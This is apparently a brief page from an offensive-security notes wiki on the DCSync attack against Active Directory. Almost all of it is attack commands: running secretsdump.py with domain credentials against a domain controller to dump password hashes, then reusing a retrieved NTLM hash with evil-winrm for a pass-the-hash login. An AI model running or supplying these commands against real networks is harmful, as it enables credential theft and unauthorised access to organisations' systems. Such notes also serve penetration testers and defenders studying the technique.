# DCSync

...



<figure><img src="../../../.gitbook/assets/image (228).png" alt=""><figcaption></figcaption></figure>

```bash
locate secretsdump.py
cp /PATH/TO/secretsdump.py .

./secretsdump.py 'DOMAIN'/'USER':'PASS'@'DC'
```

Use the retrived NTLM hash to perform a Pass-the-Hash.

```bash
evil-winrm -u $USER_ACCOUNT -H $NT_HASH -i $HOST_IP
```

